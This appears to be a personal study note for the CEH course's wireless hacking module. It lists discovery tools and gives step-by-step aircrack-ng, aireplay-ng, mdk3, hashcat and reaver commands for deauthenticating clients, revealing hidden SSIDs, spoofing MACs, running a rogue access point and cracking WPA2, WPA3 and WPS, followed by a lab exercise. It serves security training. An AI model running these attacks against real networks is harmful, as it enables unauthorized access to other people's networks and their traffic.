 2025-08-30 17:10

Status:

Tags:

# Hacking Wireless Networks

## Wireless Hacking Methodology
Attackers use the following steps to perform wireless hacking: 
- Wi-Fi discovery 
- Wireless traffic analysis 
- Launch of wireless attacks 
- Wi-Fi encryption cracking 
- Wi-Fi network compromising
### Wi-Fi Discovery
#### Wireless Network Footprinting
An attack on a wireless network begins with its discovery and footprinting. Footprinting involves locating and analyzing (or understanding) the network. To footprint a wireless network, an attacker needs to identify the BSS provided by the AP. An attacker may identify the BSS or independent BSS (IBSS) with the help of the SSID of the wireless network. Therefore, the attacker needs to determine the SSID of the target wireless network, which can be used to establish an association with an AP to compromise its security.
An attacker can use the following two footprinting methods to detect the SSID of a wireless network: 
- Passive Footprinting
	- Method Using the passive method, an attacker detects the existence of an AP by sniffing the packets from airwaves. This discloses wireless devices, APs, and the SSID. In the passive footprinting method, the attacker neither attempts to connect with any APs or wireless clients nor injects any data packet into the wireless traffic.
![[Pasted image 20250813151317.png]] 

- Active Footprinting Method
	- In this method, the attacker’s wireless device sends a probe request with the SSID to an AP and waits for a response. If the wireless device does not have the SSID in advance, it can send a probe request with an empty SSID. In the case of a probe request with an empty SSID, most APs respond with their own SSID in a probe response packet. Consequently, empty SSIDs are useful in learning the SSIDs of APs. In this method, the attacker knows the correct BSS to associate with and can configure the AP to ignore a probe request with an empty SSID.
![[Pasted image 20250813151401.png]]

Wi-Fi Discovery Tools 
- inSSIDer
 - Sparrow-wifi 
 - Wi-Fi Scanner (https://lizardsystems.com) 
 - Acrylic WiFi Heatmaps (https://www.acrylicwifi.com) 
 - WirelessMon (https://www.passmark.com) 
 - Ekahau Wi-Fi Heatmaps (https://www.ekahau.com) 
 - NetSpot (https://www.netspotapp.com) 
 - AirMagnet® Survey PRO (https://www.netally.com)
Mobile-based Wi-Fi Discovery Tools 
- WiFi Analyzer 
-  Opensignal (https://opensignal.com) 
- Network Signal Info Pro (https://www.kaibits-software.com) 
- Net Signal Pro:WiFi & 5G Meter (https://play.google.com) 
- NetSpot WiFi Analyzer (https://apps.apple.com) 
- WiFiman (https://play.google.com

### Finding WPS-Enabled APs
- to discover the access point, extended service set identifier (ESSID), and BSSID of a device or router: 
	- command 
		- `` sudo wash -i wlan0 ``

### Launch of Wireless Attacks
#### Detection of Hidden SSIDs
- using airmon-ng 
	- command 
- to make wifi card to monitor mode 
	- ``airmon-ng start <interfacename>`` `#i`
- to  to discover SSIDs 
	-  ``airodump-ng <i>``
-  to brute force and retrieve the actual hidden SSID
	- open in another terminal 
	- ``mdk3 <i> p -b 1 -c <Channel> -t <Target BSSID>``

#### MITM (man in the middle ) Attack Using Aircrack-ng
- start airmon-ng
	- ``airmon-ng start <i>
- Start airodump to discover SSIDs on interface
	- ``airodump-ng --ivs --write capture <i>``
-  De-authenticate (deauth) the client using aireplay-ng.
	- ``aireplay-ng -0 5 -a BSSID`` 
-  Associate the wireless card (fake association) with the AP to be accessed with aireplay-ng.
	- ``aireplay-ng -1 0 -e SECRET_SSID -a BSSID -h MAC add card <i>``

#### MAC Spoofing Attack 
- disable network interface 
	- ``ifconfig wlan0 down``
- enter the new MAC address 
	- ``ifconfig wlan0 hw ether 02:25:ab:4c:2a:bc`` `# hardware Ethernet (MAC) address`
	- ``ifconfig wlan0 hw ether MAC add``
- bring up the interface 
	- ``ifconfig wlan0 up ``
#### ARP Poisoning Attack Using Ettercap 
- open  Ettercap


#### Creation of a Rogue AP Using MANA Toolkit 
- Rogue AP
	- fake malicious wifi crated by attacker 
	- Modify MANA’s configuration file  hostapd-mana.conf
		-  interface= wlan0
		-  SSID = Free Internet
	-  Modify the script file start-nat-simple.sh
		-  phy = wlan0 
		-  upstream = eth0 
-  Execute the script file start-nat-simple.sh using the bash command 
	- `` bash <Path to MANA>/mana-toolkit/run-mana/start-nat-simple.sh``

### Wi-Jacking Attack
Attackers use a Wi-Jacking attack for gaining access to an enormous number of wireless networks. In this attack, the Wi-Fi information of the nearest victims can be retrieved without using any cracking mechanisms. This attack can be used when credentials are saved in the victim’s browser, when the victim accesses the same website multiple times, and when the router uses an unencrypted HTTP connection to access the router configuration interface in the browser. Attackers can take advantage of these vulnerabilities to crack WPA/WPA2 networks without going through a single handshake process. The following conditions must be met to perform a Wi-Jacking attack.
- command 
	- `` aireplay-ng -0 11 -a 22:7F:AC:6D:E6:8B -c EE:AB:46:A7:CF:18 wlx00e02d886189``
### Cracking WPA/WPA2 Using Aircrack-ng
-  make interface into monitor mode 
	- command 
		- `` airmon-ng start <i>
-  Run airodump-ng command to get a list of detected access points and connected clients. 
	- command 
		-  ``airodump-ng <i>
-  Open a new terminal and run the following airodump-ng command to capture packets from the targeted access point as the root user and leave the terminal.
	- command 
		- ``airodump-ng --bssid <BSSID> -c 1 -w <ESSID> <i> ``
-  Open a new terminal and run the following aireplay-ng command multiple times to send a large number of deauthentication packets to the connected device. 
	- command 
		-  ``aireplay-ng -0 11 -a <Access point MAC address/BSSID> -c <MAC address of connected device> <i>``
-  In another net terminal, run the following aircrack-ng command as root user with a password.txt file against the captured .cap file.
	- command 
		- ``aircrack-ng -a2 <Access point MAC address/BSSID> -w password.txt <captured file name>.cap``


### Cracking WPA3 Using Aircrack-ng and hashcat
 - Step1: Set the wireless interface to monitor mode by running the following command: 
	 - ``airmon-ng start <i>``
- Step 2: Run the following airodump-ng command as the root user on another terminal to capture the handshake: airodump-ng wlan0mon Alternatively, focus on a target network with the command:
	- ``airodump-ng --bssid <BSSID> --channel <CH> --write capture wlan0mon``
-  Step 3: De-authenticate the client to capture the handshake by running the following 
	- ``aireplay-ng command: aireplay-ng --deauth 10 -a <BSSID> -c <Client_MAC> wlan0mon``.
-  Step 4: Convert the captured .cap file to .hccapx format using hcxtools by running: 
	- ``hcxpcapngtool -o capture.hccapx <capture>.cap``
- Step 5: Finally, crack the handshake using hashcat with a wordlist file:
	- ``hashcat -m 22000 capture.hccapx </path/to/wordlist.txt>``


### Cracking WPS Using Reaver
-   Set up a wireless interface in the monitoring mode
	- ``airmon-ng start wlan0 ``
-  Use the Wash utility to detect WPS-enabled devices using the following command: 
	- ``wash -i <i>``
-   If WPS-enabled devices could not be detected using the Wash utility, use Airodump-ng to detect devices using WPS through the following command:
	- ``airodump-ng <i>``
 - After identifying the BSSID of the target device, start cracking the WPS PIN using Reaver through the following command: 
	-  ``reaver -i < Name of the monitor-mode interface to use> -b < BSSID of the target AP> -vv <Display non-critical warnings>``
	 - example 
		 - ``reaver –i wlan0mon -b B4:75:0E:89:00:60 -vv ``




| functions                                                                                  | commands                                                           |
| ------------------------------------------------------------------------------------------ | ------------------------------------------------------------------ |
| ``# 1 Detection of Hidden SSIDs ``                                                         |                                                                    |
| to make wifi card to monitor mode                                                          | ``airmon-ng start <interfacename>``                                |
| to discover SSIDs on the interface                                                         | ``airodump-ng <i>``                                                |
| to brute force and retrieve the actual hidden SSID                                         | ``mdk3 <i> p -b 1 -c <Channel> -t <Target BSSID>``                 |
| Captures only WEP IVs on ``<i>`` in monitor mode and saves them as capture files.          | ``airodump-ng --ivs --write capture <i>``                          |
| to performs a Wi-Fi De-authenticate attack:                                                | ``aireplay-ng -0 5 -a BSSID``                                      |
| Associate the wireless card (fake association) with the AP to be accessed with aireplay-ng | ``aireplay-ng -1 0 -e SECRET_SSID -a BSSID -h MACadd of card <i>`` |




# Lab 1: Perform Wireless Traffic Analysis


## Task 1: Wi-Fi Packet Analysis using Wireshark

# Lab 2: Perform Wireless Attacks
## Task 1: Crack a WPA2 Network using Aircrack-ng
- open parrot 
1. in Desktop ->  **CEHv13 Module 16** -> copy samples and wordlist to Desktop
2. open terminal as sudo user 
3. perform password cracking 
	- command 
		- ``aircrack-ng -a2 -b [Target BSSID] -w /home/attacker/Desktop/Wordlist/password.txt '/home/attacker/Desktop/Sample Captures/WPA2crack-01.cap'``
4. The result appears, showing the WPA handshake packet captured with airodump-ng. The target access point's password is cracked and displayed in plain text next to the message **KEY FOUND!**








### References
